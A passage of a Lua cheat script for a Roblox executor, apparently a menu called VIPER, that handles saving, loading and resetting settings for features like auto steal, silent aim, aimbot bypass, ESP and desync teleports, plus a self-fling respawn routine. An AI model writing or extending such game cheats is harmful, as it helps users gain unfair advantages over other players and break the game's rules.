    if _viperSaveState.writing or (not force and _tick() - _viperSaveState.lastAt < 0.25) then
        if not _viperSaveState.queued then
            _viperSaveState.queued = true
            task.delay(0.25, function()
                _viperSaveState.queued = false
                saveAllSettings(true)
            end)
        end
        return true
    end
    local readFn, writeFn = resolveViperFileApi()
    if not readFn or not writeFn then
        warn("[VIPER Save] Executor file API is unavailable.")
        return false
    end
    _viperSaveState.writing = true
    _viperSaveState.revision = _viperSaveState.revision + 1
    config.revision = _viperSaveState.revision
    config.savedAt = os.time()
    local json = HS:JSONEncode(config)
    local ok = pcall(function()
        if viperFileExists(CONFIG_FILE) then
            local previous = readFn(CONFIG_FILE)
            if type(previous) == "string" then writeFn(CONFIG_FILE .. ".backup", previous) end
        end
        writeFn(CONFIG_FILE, json)
        local readBack = readFn(CONFIG_FILE)
        if readBack ~= json then error("save verification failed") end
        HS:JSONDecode(readBack)
    end)
    _viperSaveState.writing = false
    _viperSaveState.lastAt = _tick()
    if ok then _lastSavedJSON = snapshot else warn("[VIPER Save] Write or verification failed.") end
    return ok
end

-- Safety autosave: checks the complete settings snapshot periodically. Unchanged settings
-- are skipped, while small UI/position/slider changes are saved even if a callback missed one.
task.spawn(function()
    while LP and LP.Parent do
        task.wait(1.25)
        if _viperAutosaveReady and gui and gui.Parent and not _isLoading and not _isResetting then
            pcall(saveAllSettings)
        end
    end
end)

do
    local readFn, writeFn = resolveViperFileApi()
    if readFn and writeFn then
        oldPath = string.char(66, 108, 111, 111, 100, 72, 111, 117, 110, 100, 115, 95) .. tostring(LP.UserId) .. ".json"
        okOld, old = pcall(readFn, oldPath)
        okNew, _ = pcall(readFn, CONFIG_FILE)
        if okOld and type(old) == "string" and not okNew then
            pcall(writeFn, CONFIG_FILE, old)
            warn("[VIPER X NEBULA] Config migrada de " .. oldPath .. " a " .. CONFIG_FILE)
        end
    end
end

function loadAllSettings()
    local readFn = resolveViperFileApi()
    if not readFn then return false end
    if not viperFileExists(CONFIG_FILE) then
        local oldConfig = string.char(89, 111, 117, 116, 95) .. tostring(LP.UserId) .. ".json"
        if viperFileExists(oldConfig) then
            pcall(function()
                local oldData = readFn(oldConfig)
                local writeFn = select(2, resolveViperFileApi())
                if writeFn and oldData then writeFn(CONFIG_FILE, oldData) end
            end)
        end
    end
    if not viperFileExists(CONFIG_FILE) then return false end
    local success, data = pcall(function() return HS:JSONDecode(readFn(CONFIG_FILE)) end)
    if not success or not data then return false end
    _isLoading = true
    local layoutData = data.uiLayoutSettings or data.customModeSettings
    if type(layoutData) == "table" then
        local savedLayout = layoutData
        local savedMobileShape = savedLayout.mobileShape
        if savedMobileShape ~= "Square" and savedMobileShape ~= "Circle" and savedMobileShape ~= "Hexagon" then
            savedMobileShape = "Rounded"
        end
        uiLayoutSettings = {
            navLayout = (savedLayout.navLayout == "Left" or savedLayout.navLayout == "Right" or savedLayout.navLayout == "Bottom") and savedLayout.navLayout or "Top",
            panelShape = savedLayout.panelShape == "Square" and "Square" or "Rounded",
            mobileShape = savedMobileShape,
        }
    end
    if data.playIntroEnabled ~= nil then playIntroEnabled = data.playIntroEnabled == true end
    local savedIntroIndex = tonumber(data.selectedIntroIndex or data.introSoundIndex)
    if savedIntroIndex then selectedIntroIndex = math.clamp(math.floor(savedIntroIndex), 1, 3) end
    NS = data.normalSpeed or NS
    CS = data.carrySpeed or CS
    LAGGER_SPEED = data.laggerSpeed1 or LAGGER_SPEED
    if data.hiddenMobileButtons then hiddenMobileButtons = data.hiddenMobileButtons end
    if data.autoGrabScale ~= nil then
        autoGrabScale = _clamp(tonumber(data.autoGrabScale) or 1, 0.30, 2.00)
        if pbScale then pbScale.Scale = autoGrabScale end
    end
    if data.smoothStealEnabled ~= nil then
        CONFIG.SMOOTH_STEAL_ENABLED = data.smoothStealEnabled
        if smoothStealSetVisual then smoothStealSetVisual(CONFIG.SMOOTH_STEAL_ENABLED) end
    end
    if data.smoothStealSpeed then
        CONFIG.SMOOTH_STEAL_SPEED = tonumber(data.smoothStealSpeed) or 28
        if smoothStealSpeedBox then smoothStealSpeedBox.Text = tostring(CONFIG.SMOOTH_STEAL_SPEED) end
    end
    LAGGER_CARRY_SPEED = data.laggerSpeed2 or LAGGER_CARRY_SPEED
    if data.desyncSpeed then
        DESYNC_SPEED = tonumber(data.desyncSpeed) or DESYNC_SPEED
        if desBox then desBox.Text = tostring(DESYNC_SPEED) end
    end
    if data.desyncStealSpeed then
        DESYNC_STEAL_SPEED = tonumber(data.desyncStealSpeed) or DESYNC_STEAL_SPEED
        if desStealBox then desStealBox.Text = tostring(DESYNC_STEAL_SPEED) end
    end
    CONFIG.STEAL_RANGE = data.stealRadius or CONFIG.STEAL_RANGE
    if radInput then radInput.Text = tostring(CONFIG.STEAL_RANGE) end
    if tonumber(data.configVersion) >= 2 and data.lockUI ~= nil then
        uiLocked = data.lockUI
    else
        uiLocked = false
    end
    mobileButtonsLocked = data.mobileButtonsLocked or false
    if data.antiRagdollMode then
        antiRagdollMode = data.antiRagdollMode
    else
        antiRagdollMode = data.antiRagdoll and "v2" or "off"
    end
    antiDieEnabled = data.antiDieEnabled or false
    antiBatEnabled = data.antiBat or false
    antiFlingEnabled = data.antiFling or false
    selectedStealMode = (data.selectedStealMode == "V2") and "V2" or "V1"
    -- The Auto Grab bar style (V1/V2) is independent from the Auto Steal logic
    -- mode. Save/load them separately so each selector remembers its own choice.
    selectedAutoGrabUI = (data.selectedAutoGrabUI == "V2") and "V2" or "V1"
    if selectedStealMode == "V2" then
        CONFIG.STEAL_RANGE = 60
        Steal.StealRadius = 60
        if radInput then radInput.Text = "60" end
    end
    CONFIG.AUTO_STEAL_ENABLED = data.autoSteal or false
    if data.showMobileButtons ~= nil then CONFIG.SHOW_MOBILE_BUTTONS = data.showMobileButtons else CONFIG.SHOW_MOBILE_BUTTONS = true end
    medusaCounterEnabled = data.medusaCounter or false
    batCounterEnabled = data.batCounter or false
    batCounterV2Enabled = data.batCounterV2 or false
    unwalkEnabled = data.unwalkEnabled or data.unwalk or false
    antiLagEnabled = data.antiLag or false
    laggerToggled = data.laggerToggled or false
    speedMode = data.carryMode or false
    laggerCarryToggled = data.laggerCarryToggled or false
    uiScaleValue = _clamp(tonumber(data.uiScale) or (tonumber(data.mainUIScale) and tonumber(data.mainUIScale) * 100) or 78, 40, 180)
    if mainUIScale then mainUIScale.Scale = uiScaleValue / 100 end
    -- Auto Grab uses its own scale. Do not overwrite it with the main UI scale.
    if pbScale then pbScale.Scale = autoGrabScale end
    espEnabled = data.espEnabled or false
    espLineEnabled = data.espLineEnabled or false
    if espEnabled then pcall(toggleESP, true) else pcall(toggleESP, false) end

    vividGraphicsEnabled = data.vividGraphics or false
    hideButtonsEnabled = data.hideButtons or false

    if data.themeColor and COLOR_THEMES[data.themeColor] then
        currentColorTheme = data.themeColor
        selectedColor = COLOR_THEMES[data.themeColor]
    else
        currentColorTheme = "Orange"
        selectedColor = Color3.fromRGB(255, 110, 20)
    end
    task.defer(function() updateAllUIThemeColors(selectedColor) end)

    local tpBatStateLoaded = data.tpBatEnabled or false
    if tpBatStateLoaded then
        task.defer(function()
            pcall(function()
                startBatDesyncTp()
                if batDesyncTpSetVisual then batDesyncTpSetVisual(true) end
            end)
        end)
    else
        if batDesyncTpSetVisual then batDesyncTpSetVisual(false) end
    end
    skyTheme = data.skyTheme or "Off"
    if skyTheme ~= "Off" then pcall(applyCustomSky, skyTheme) end
    if skySelectorLabel then skySelectorLabel.Text = skyTheme end
    if data.animPack and ANIM_PACKS[data.animPack] then
        pcall(startAnimPack, data.animPack)
    else
        currentAnimPack = "Off"
        stopAnimPack()
    end
    local function lk(e, d)
        if not d then return end
        -- An explicit saved None must clear the default binding rather than
        -- silently restoring it on the next launch.
        e.kb = nil
        e.gp = nil
        if d.kb and Enum.KeyCode[d.kb] then e.kb = Enum.KeyCode[d.kb] end
        if d.gp and Enum.KeyCode[d.gp] then e.gp = Enum.KeyCode[d.gp] end
    end
    lk(KB.DropBrainrot, data.dropBrainrotKey)
    lk(KB.AutoLeft, data.autoLeftKey)
    lk(KB.AutoRight, data.autoRightKey)
    lk(KB.AutoBat, data.autoBatKey)
    lk(KB.TPFloor, data.tpFloorKey)
    lk(KB.GuiHide, data.guiHideKey)
    lk(KB.CarryToggle, data.carryToggleKey)
    lk(KB.LaggerMode, data.laggerModeKey)
    lk(KB.TPBat, data.tpBatKey)
    lk(KB.InstaReset, data.instaResetKey)
    lk(KB.DesyncTp, data.desyncTpKey)
    lk(KB.MirrorTP, data.mirrorTPKey)
    lk(KB.BypassAimbot, data.bypassAimbotKey)
    mirrorTPDownV2Enabled = data.mirrorTPDownV2 or false
    task.defer(function()
        pcall(setMirrorTPDownV2, mirrorTPDownV2Enabled)
    end)
    if data.mobileButtonPositions then savedButtonPositions = data.mobileButtonPositions end
    if data.mobilePanelPos then savedMobilePanelPos = data.mobilePanelPos end
    if data.mainPosition and main then
        main.Position = UDim2.new(data.mainPosition.XScale or 0, data.mainPosition.XOffset or 20, data.mainPosition.YScale or 0, data.mainPosition.YOffset or 2)
    end
    if data.tpBatFloatingPos then tpBatFloatingPos = data.tpBatFloatingPos end
    if data.instaResetFloatingPos then instaResetFloatingPos = data.instaResetFloatingPos end
    if data.progressBarPos then savedProgressBarPos = data.progressBarPos end
    if data.bodyLockEnabled ~= nil then
        bodyLockEnabled = data.bodyLockEnabled
        if bodyLockEnabled then
            task.defer(function()
                if bodyLockSetVisual then bodyLockSetVisual(true) end
                startBodyLock()
            end)
        end
    end
    if data.bodyLockRange then
        bodyLockRange = data.bodyLockRange
        if bodyLockRangeBox then bodyLockRangeBox.Text = tostring(bodyLockRange) end
    end
    dropMode = data.dropMode or 1
    stretchEnabled = data.stretchEnabled or false
    stretchFOV = data.stretchFOV or 120
    BAT_AIMBOT_SPEED = data.batAimbotSpeed or BAT_AIMBOT_SPEED
    selectedAimbotMode = (data.aimbotMode == "V2") and "V2" or "V1"
    backgroundIndex = math.clamp(tonumber(data.backgroundIndex) or 1, 1, #backgroundImages)
    backgroundImageTransparency = math.clamp(tonumber(data.backgroundImageTransparency) or 0, 0, 1)
    if data.backgroundMode == "None" then
        backgroundMode = "None"
    else
        local savedIndex = tonumber(tostring(data.backgroundMode or ""):match("Background (%d+)"))
        if savedIndex then backgroundIndex = math.clamp(savedIndex, 1, #backgroundImages) end
        backgroundMode = "Background " .. tostring(backgroundIndex)
    end
    floatingButtonScale = _clamp(tonumber(data.floatingButtonScale) or 1, 0.40, 2.50)
    if data.outfitIndex and data.outfitIndex >= 1 and data.outfitIndex <= #OUTFITS then
        currentOutfitIndex = data.outfitIndex
        task.defer(function()
            pcall(function() applyOutfitByIndex(currentOutfitIndex) end)
            if outfitSelectorLabel then
                outfitSelectorLabel.Text = OUTFITS[currentOutfitIndex].label
            end
        end)
    end
    if _G._viperStealModeSetter then
        task.defer(function() _G._viperStealModeSetter(selectedStealMode) end)
    end
    if vividGraphicsEnabled then
        task.defer(function() pcall(enableVividGraphics) end)
    else
        task.defer(function() pcall(disableVividGraphics) end)
    end
    autoBatEnabled = false
    autoLeftEnabled = false
    autoRightEnabled = false
    if dropModeBtnRef then dropModeBtnRef.Text = dropMode == 1 and "Fling" or "Jump Drop" end
    if aimbotModeBtnRef then aimbotModeBtnRef.Text = selectedAimbotMode or "V1" end
    if batCounterEnabled then
        task.defer(function()
            if setBatCounterVisual then setBatCounterVisual(true) end
            startBatCounter()
        end)
    elseif batCounterV2Enabled then
        task.defer(function()
            if setBatCounterV2Visual then setBatCounterV2Visual(true) end
            startBatCounterV2()
        end)
    end
    if medusaCounterEnabled then
        task.defer(function()
            if setMedusaVisual then setMedusaVisual(true) end
            if LP.Character then setupMedusaCounter(LP.Character) end
        end)
    end
    if unwalkEnabled then
        task.defer(function()
            if setUnwalkVisual then setUnwalkVisual(true) end
            startUnwalk()
        end)
    end
    if antiBatEnabled then
        task.defer(function()
            if setAntiBatVisual then setAntiBatVisual(true) end
            startAntiBat()
        end)
    end
    if antiFlingEnabled then
        task.defer(function()
            if setAntiFlingVisual then setAntiFlingVisual(true) end
            startAntiFling()
        end)
    end
    if antiDieEnabled then
        task.defer(function()
            if setAntiDieVisual then setAntiDieVisual(true) end
            AntiDieModule.start()
        end)
    end
    if antiRagdollMode == "v2" then
        task.defer(function()
            if setAntiRagVisual then setAntiRagVisual(true) end
            startAntiRagdollV2()
        end)
    end
    if antiLagEnabled then
        task.defer(function()
            if setAntiLagVisual then setAntiLagVisual(true) end
            enableAntiLag()
        end)
    end
    if CONFIG.AUTO_STEAL_ENABLED then
        task.defer(function()
            if setInstaGrab then setInstaGrab(true) end
    
            if autoStealSpeedSetVisual then autoStealSpeedSetVisual(true) end
            pcall(startAutoSteal)
        end)
    end
    if data.silentAimStudRange ~= nil then
        silentAimStudRange = tonumber(data.silentAimStudRange) or 15
        if silentAimRangeBox then silentAimRangeBox.Text = tostring(silentAimStudRange) end
    end
    if data.silentAimEnabled ~= nil then
        silentAimEnabled = data.silentAimEnabled == true
        task.defer(function()
            if silentAimEnabled then
                if setSilentAimVisual then setSilentAimVisual(true) end
                startSilentAim()
            else
                if setSilentAimVisual then setSilentAimVisual(false) end
                stopSilentAim()
            end
        end)
    end
    if data.autoMedusaStudRange ~= nil then
        autoMedusaStudRange = tonumber(data.autoMedusaStudRange) or 15
        if autoMedusaRangeBox then autoMedusaRangeBox.Text = tostring(autoMedusaStudRange) end
    end
    if data.autoMedusaEnabled ~= nil then
        autoMedusaEnabled = data.autoMedusaEnabled == true
        task.defer(function()
            if autoMedusaEnabled then
                if setMedusaAutoVisual then setMedusaAutoVisual(true) end
                startAutoMedusa()
            else
                if setMedusaAutoVisual then setMedusaAutoVisual(false) end
                stopAutoMedusa()
            end
        end)
    end
    refreshSpeedModeLabel()
    if setShowMobileButtonsVisual then setShowMobileButtonsVisual(CONFIG.SHOW_MOBILE_BUTTONS) end
    if setLockMobileButtonsVisual then setLockMobileButtonsVisual(mobileButtonsLocked) end
    _lastSavedJSON = buildViperSettingsSnapshot(buildConfigTable())
    if MobilePanel then MobilePanel.Enabled = CONFIG.SHOW_MOBILE_BUTTONS end
    _isLoading = false
    return true
end

function forceResetUI()
    if normalBox then normalBox.Text = tostring(NS) end
    if carryBox then carryBox.Text = tostring(CS) end
    if radInput then radInput.Text = tostring(CONFIG.STEAL_RANGE) end
    if laggerBox then laggerBox.Text = tostring(LAGGER_SPEED) end
    if lagger2Box then lagger2Box.Text = tostring(LAGGER_CARRY_SPEED) end
    if batSpeedBox then batSpeedBox.Text = tostring(BAT_AIMBOT_SPEED) end
    if normAimBox then normAimBox.Text = tostring(BAT_AIMBOT_SPEED) end
    if lagAimBox then lagAimBox.Text = tostring(BAT_AIMBOT_SPEED) end
    if desAimBox then desAimBox.Text = tostring(BAT_AIMBOT_SPEED) end
    if desBox then desBox.Text = tostring(DESYNC_SPEED) end
    if desStealBox then desStealBox.Text = tostring(DESYNC_STEAL_SPEED) end
    if uiScaleBox then uiScaleBox.Text = tostring(uiScaleValue) end
    -- Synchronize slider knobs/labels with the loaded settings; the GUI is
    -- created before the JSON settings are applied.
    if scaleSliderSetters then
        if scaleSliderSetters.ui then pcall(scaleSliderSetters.ui, uiScaleValue) end
        if scaleSliderSetters.autoGrab then pcall(scaleSliderSetters.autoGrab, autoGrabScale * 100) end
        if scaleSliderSetters.mobileButtons then pcall(scaleSliderSetters.mobileButtons, floatingButtonScale * 100) end
    end
    if refreshAutoGrabUISelector then pcall(refreshAutoGrabUISelector) end
    if dropModeBtnRef then dropModeBtnRef.Text = dropMode == 1 and "Fling" or "Jump Drop" end
    if aimbotModeBtnRef then aimbotModeBtnRef.Text = selectedAimbotMode or "V1" end
    if bodyLockRangeBox then bodyLockRangeBox.Text = tostring(bodyLockRange) end
    if silentAimRangeBox then silentAimRangeBox.Text = tostring(silentAimStudRange or 15) end
    if autoMedusaRangeBox then autoMedusaRangeBox.Text = tostring(autoMedusaStudRange or 15) end
    local function safeSet(fn, val) if fn then fn(val) end end
    safeSet(autoBatSetVisual, false)
    safeSet(autoLeftSetVisual, false)
    safeSet(autoRightSetVisual, false)
    safeSet(setBatCounterVisual, false)
    safeSet(setBatCounterV2Visual, false)
    safeSet(setMedusaVisual, false)
    safeSet(setSilentAimVisual, false)
    safeSet(setMedusaAutoVisual, false)
    safeSet(setUnwalkVisual, false)
    safeSet(setAntiLagVisual, false)
    safeSet(setLockUIVisual, false)
    safeSet(setInstaGrab, false)
    safeSet(autoStealSpeedSetVisual, false)
    safeSet(batDesyncTpSetVisual, false)
    safeSet(setESPVIsual, false)
    safeSet(setESPLineVisual, false)
    safeSet(setVividVisual, false)
    safeSet(setHideButtonsVisual, false)
    safeSet(bodyLockSetVisual, false)
    safeSet(setAntiDieVisual, false)
    safeSet(setAntiBatVisual, false)
    safeSet(setAntiFlingVisual, false)
    safeSet(setAntiRagVisual, false)
    safeSet(setMirrorTPV2Visual, false)
    safeSet(setBypassAimbotVisual, false)
    if stopSilentAim then stopSilentAim() end
    if stopAutoMedusa then stopAutoMedusa() end
    disableVividGraphics()
    applyHideButtons(false)
    if _G.stretchToggleSetter then _G.stretchToggleSetter(false) end
    safeSet(mobSetAutoBat, false)
    safeSet(mobSetAutoLeft, false)
    safeSet(mobSetAutoRight, false)
    safeSet(mobSetDropBR, false)
    safeSet(mobSetTpDown, false)
    safeSet(mobSetCarry, false)
    safeSet(mobSetLagger1, false)
    safeSet(mobSetLagger2, false)
    safeSet(mobSetDesyncSpd, false)
    desyncSpeedToggled = false
desyncCarryToggled = false
    refreshSpeedModeLabel()
    updateProgressBarVisibility()
    disableAntiLag()
    if stopAntiBat then stopAntiBat() end
    if stopAntiFling then stopAntiFling() end
    if stopESPLine then stopESPLine() end
    skyTheme = "Off"
    pcall(applyCustomSky, "Off")
    if skySelectorLabel then skySelectorLabel.Text = "Off" end
    if antiDieEnabled then
        AntiDieModule.stop()
        antiDieEnabled = false
    end
    for _, ref in ipairs(keyButtonRefs) do
        local entry = ref.entry
        local label = (entry.gp and entry.gp.Name) or (entry.kb and entry.kb.Name) or "None"
        ref.btn.Text = label
    end
    currentColorTheme = "Orange"
    selectedColor = Color3.fromRGB(255, 110, 20)
    updateAllUIThemeColors(selectedColor)
    if miniBtn then
        local stroke = miniBtn:FindFirstChildOfClass("UIStroke")
        if stroke then stroke.Color = Color3.fromRGB(42, 43, 47) end
    end
    if MobilePanel then
        for _, btn in ipairs(MobilePanel:GetChildren()) do
            if btn:IsA("TextButton") then
                local label = btn:FindFirstChildOfClass("TextLabel")
                if label then
                    local isActive = btn.BackgroundColor3 == selectedColor
                    if not isActive then label.TextColor3 = selectedColor end
                end
            end
        end
    end
    saveAllSettings()
end

function resetFloatingPositions()
    if MobilePanel then
        savedButtonPositions = {}
        for _, btn in ipairs(MobilePanel:GetChildren()) do
            if btn:IsA("TextButton") and btn.Name then
                local defX, defY = getDefaultButtonPosition(btn.Name)
                btn.Position = UDim2.new(0, defX, 0, defY)
            end
        end
    end

    if pbFrame then
        pbFrame.Position = UDim2.new(0.5, -160, 0.80, 0)
        savedProgressBarPos = nil
    end
    savedMobilePanelPos = nil
    end

function resetToFactoryDefaults()
    _isResetting = true
    local ok, err = pcall(function()
        stopAutoSteal()
        stopBatCounter()
        stopBatCounterV2()
        stopMedusaCounter()
        if AntiRagdollV2.Enabled then stopAntiRagdollV2() end
        if antiDieEnabled then AntiDieModule.stop() end
        if antiBatEnabled and stopAntiBat then stopAntiBat() end
        if antiFlingEnabled and stopAntiFling then stopAntiFling() end
        stopUnwalk()
        disableAutoBat()
        if batDesyncTpEnabled then stopBatDesyncTp() end
        pcall(setMirrorTPDownV2, false)
        pcall(disableBypassAimbot)
        stopBodyLock()
        if espEnabled then toggleESP(false) end
        if espLineEnabled and stopESPLine then stopESPLine() end
        if stretchEnabled then disableStretch() end
        if antiLagEnabled then disableAntiLag() end
        if vividGraphicsEnabled then disableVividGraphics() end
        if hideButtonsEnabled then applyHideButtons(false) end
        if dropActive then stopDropBrainrot() end
        skyTheme = "Off"
        pcall(applyCustomSky, "Off")
        if skySelectorLabel then skySelectorLabel.Text = "Off" end
        if antiDieEnabled then AntiDieModule.stop(); antiDieEnabled = false end
        NS = 60; CS = 29; LAGGER_SPEED = 15; LAGGER_CARRY_SPEED = 24.5
        DESYNC_SPEED = 47; DESYNC_STEAL_SPEED = 35
        CONFIG.STEAL_RANGE = 61
        speedMode = false; laggerToggled = false; laggerCarryToggled = false; desyncSpeedToggled = false
desyncCarryToggled = false
        antiRagdollMode = "off"; antiDieEnabled = false
        antiBatEnabled = false
        antiFlingEnabled = false
        medusaCounterEnabled = false; batCounterEnabled = false; batCounterV2Enabled = false
        autoBatEnabled = false; autoLeftEnabled = false; autoRightEnabled = false
        unwalkEnabled = false; antiLagEnabled = false
        uiLocked = false; mobileButtonsLocked = false
        CONFIG.AUTO_STEAL_ENABLED = false
        CONFIG.SMOOTH_STEAL_ENABLED = false
        CONFIG.SMOOTH_STEAL_SPEED = 28
        if smoothStealSetVisual then smoothStealSetVisual(false) end
        if smoothStealSpeedBox then smoothStealSpeedBox.Text = '28' end
        selectedStealMode = "V1"
        if _G._viperStealModeSetter then pcall(_G._viperStealModeSetter, "V1") end
        BAT_AIMBOT_SPEED = 58
        dropMode = 1; stretchEnabled = false; stretchFOV = 120
        uiScaleValue = 78
        autoGrabScale = 1
        if mainUIScale then mainUIScale.Scale = uiScaleValue / 100 end
        if pbScale then pbScale.Scale = autoGrabScale end
        espEnabled = false; espLineEnabled = false; vividGraphicsEnabled = false; hideButtonsEnabled = false
        bodyLockEnabled = false; bodyLockRange = 20
        backgroundIndex = 1; backgroundImageTransparency = 0; backgroundMode = "Background 1"
        floatingButtonScale = 1
        applyFloatingButtonScale()
        selectedAutoGrabUI = "V1"
        selectedIntroIndex = 1
        playIntroEnabled = true
        if batDesyncTpEnabled then stopBatDesyncTp() end
        currentAnimPack = "Off"; stopAnimPack()
        currentOutfitIndex = 1
        currentColorTheme = "Orange"; selectedColor = Color3.fromRGB(255, 110, 20)
        if main then main.Position = UDim2.new(0, 20, 0, 2); _G.__ViperMainOriginalPos = main.Position end
        for key, val in pairs(DEFAULT_KB) do
            if KB[key] then KB[key].kb = val.kb; KB[key].gp = val.gp end
        end
        resetFloatingPositions()
        forceResetUI()
        updateProgressBarVisibility()
        refreshSpeedModeLabel()
        _lastSavedJSON = nil
    end)
    _isResetting = false
    if not ok then warn("[resetToFactoryDefaults]", err) end
    if ok then saveAllSettings(true) end
    return ok
end

function updateProgressBarVisibility()
    if pbFrame then
        pbFrame.Visible = (CONFIG.AUTO_STEAL_ENABLED == true)
    end
end

function applyShimmerToText(obj, speed)
    speed = speed or 0.8
    local color = getThemeColor()
    local grad = Instance.new("UIGradient", obj)
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, color),
        ColorSequenceKeypoint.new(0.3, Color3.fromRGB(200,200,200)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(200,200,200)),
        ColorSequenceKeypoint.new(1, color),
    })
    grad.Rotation = 45
    grad.Offset = Vector2.new(0,0)
    task.spawn(function()
        local t = 0
        while grad and grad.Parent do
            t = t + 0.02
            grad.Offset = Vector2.new(math.sin(t * speed) * 0.4, 0)
            task.wait(0.04)
        end
    end)
    return grad
end

function getDefaultButtonPosition(btnName)
    local BTN_W, BTN_H = 60, 60
    local GAP = 8
    local orderMap = { DropBR = 0, AutoLeft = 1, AutoBat = 2, AutoRight = 3, TpDown = 4, Carry = 5, Lagger1 = 6, Lagger2 = 7, DesyncSpd = 8 }
    local order = orderMap[btnName] or 0
    local row = _floor(order / 2)
    local col = order % 2
    return col * (BTN_W + GAP), row * (BTN_H + GAP + 10)
end

-- [FIX INSTA RESET VIOLETTE]
do
    if not _G.InstaResetLoaded then
        _G.InstaResetLoaded = true

        state = _G._ViperInstaResetState
        if type(state) ~= "table" then
            state = {
                busy = false, busyAt = 0,
                token = 0,
                cameraConn = nil, cameraHeld = false, cameraHeldAt = 0,
                speed = 1000000,
                wantAntiDie = nil,
                wantAntiBat = nil,
                wantTpBatDie = nil,
            }
            _G._ViperInstaResetState = state
        end

        HOLD_TIME   = 1.5
        FALLBACK    = 1.2
        WAIT_RESPAWN = 8

        function suspendGuards()
            if _antiDieEnabled then
                state.wantAntiDie = true
                pcall(function() _antiDieSetEnabled(false) end)
            end
            if AntiDieModule and AntiDieModule.enabled then
                state.wantAntiDie = true
                pcall(function() AntiDieModule.stop() end)
            end
            if antiBatEnabled then
                state.wantAntiBat = true
                pcall(stopAntiBat)
            end
            if _G._AdaptTpBatAntiDie and _G._VynxTPBatOn then
                state.wantTpBatDie = true
                pcall(_G._AdaptTpBatAntiDie.stop)
            end
        end

        function restoreGuards()
            if state.wantAntiDie then
                state.wantAntiDie = nil
                pcall(function()
                    antiDieEnabled = true
                    if AntiDieModule then AntiDieModule.start() end
                    if _antiDieSetEnabled then _antiDieSetEnabled(true) end
                end)
            end
            if state.wantAntiBat then
                state.wantAntiBat = nil
                pcall(function() if antiBatEnabled then startAntiBat() end end)
            end
            if state.wantTpBatDie and _G._AdaptTpBatAntiDie and _G._VynxTPBatOn then
                state.wantTpBatDie = nil
                pcall(_G._AdaptTpBatAntiDie.start)
            end
        end

        local function holdCamera(oldChar)
            local cam = workspace.CurrentCamera
            if not cam then return end
            if state.cameraHeld and (os.clock() - (state.cameraHeldAt or 0)) < 5 then return end
            state.cameraHeld = true
            state.cameraHeldAt = os.clock()
            local heldCFrame, heldFocus = cam.CFrame, cam.Focus

            pcall(function()
                cam.CameraType = Enum.CameraType.Scriptable
                cam.CFrame = heldCFrame
                cam.Focus = heldFocus
            end)

            state.cameraConn = RunService.RenderStepped:Connect(function()
                if workspace.CurrentCamera ~= cam then return end
                cam.CameraType = Enum.CameraType.Scriptable
                cam.CFrame = heldCFrame
                cam.Focus = heldFocus
            end)

            task.spawn(function()
                local elapsed = 0
                while LP.Character == oldChar and elapsed < 3 do
                    elapsed = elapsed + task.wait()
                end
                if state.cameraConn then
                    pcall(function() state.cameraConn:Disconnect() end)
                    state.cameraConn = nil
                end
                state.cameraHeld = false
                local newCam = workspace.CurrentCamera or cam
                if newCam then
                    pcall(function()
                        newCam.CameraType = Enum.CameraType.Custom
                        local newChar = LP.Character
                        local hum = newChar and newChar:FindFirstChildOfClass("Humanoid")
                        if hum then newCam.CameraSubject = hum end
                    end)
                end
            end)
        end

        local function flingUp(character)
            local root = character and character:FindFirstChild("HumanoidRootPart")
            if not (root and root:IsA("BasePart")) then return false end
            local hum = character:FindFirstChildOfClass("Humanoid")
            if hum then
                pcall(function()
                    hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
                    hum.BreakJointsOnDeath = true
                    hum.PlatformStand = true
                    hum:ChangeState(Enum.HumanoidStateType.Freefall)
                end)
            end
            local vel = Vector3.new(0, math.clamp(state.speed, 1000, 10000000), 0)
            local function pulse()
                if not root.Parent then return false end
                return pcall(function()
                    root.AssemblyAngularVelocity = Vector3.zero
                    root.AssemblyLinearVelocity = vel
                end)
            end
            if not pulse() then return false end
            task.spawn(function()
                local elapsed = 0
                while elapsed < HOLD_TIME do
                    elapsed = elapsed + RunService.Heartbeat:Wait()
                    if not root.Parent then return end
                    if LP.Character ~= character then return end
                    pulse()
                end
            end)
            return true
        end

        local function hardKill(character)
            local hum = character and character:FindFirstChildOfClass("Humanoid")
            if not hum then return end
            pcall(function()
                hum.PlatformStand = false
                hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
                hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
                hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
                hum.BreakJointsOnDeath = true
                if hum.MaxHealth == math.huge or hum.MaxHealth <= 0 then hum.MaxHealth = 100 end
                hum.Health = 0
            end)
            pcall(function() character:BreakJoints() end)
        end

        local function doReset()
            local character = LP.Character
            local hum = character and character:FindFirstChildOfClass("Humanoid")
            local root = character and character:FindFirstChild("HumanoidRootPart")
            if not (character and hum and root and root:IsA("BasePart")) then
                return
            end
            if state.busy and (os.clock() - (state.busyAt or 0)) < 5 then return end

            state.busy = true
            state.busyAt = os.clock()
            state.token = (state.token or 0) + 1
            local myToken = state.token

            suspendGuards()

            task.spawn(function()
                holdCamera(character)

                if not flingUp(character) then
                    hardKill(character)
                end

                local elapsed = 0
                while LP.Character == character and elapsed < FALLBACK do
                    elapsed = elapsed + task.wait()
                end
                if LP.Character == character then
                    local hum2 = character:FindFirstChildOfClass("Humanoid")
                    if hum2 and hum2.Health > 0 then
                        hardKill(character)
                    end
                end

                local waited = 0
                while LP.Character == character and waited < WAIT_RESPAWN do
                    waited = waited + task.wait()
                end

                if state.token ~= myToken then return end
                state.busy = false
                restoreGuards()
            end)
        end

        RunService.Heartbeat:Connect(function()
            if not state.wantAntiDie then return end
            if state.busy and (os.clock() - (state.busyAt or 0)) < 10 then
                if _antiDieEnabled then pcall(function() _antiDieSetEnabled(false) end) end
                if AntiDieModule and AntiDieModule.enabled then pcall(function() AntiDieModule.stop() end) end
                return
            end
            if (os.clock() - (state.busyAt or 0)) >= 10 then
                state.busy = false
                restoreGuards()
            end
        end)

        LP.CharacterAdded:Connect(function()
            state.cameraHeld = false
            if state.cameraConn then
                pcall(function() state.cameraConn:Disconnect() end)
                state.cameraConn = nil
            end
        end)

        local _lastRequest = 0
        _G.InstaReset = {
            Trigger = function()
                local now = os.clock()
                if now - _lastRequest < 0.15 then return end
                _lastRequest = now
                doReset()
            end,
        }
        _G.VynxDoInstaReset = _G.InstaReset.Trigger
    end
end

function buildGui()
    local openVIPERSearch
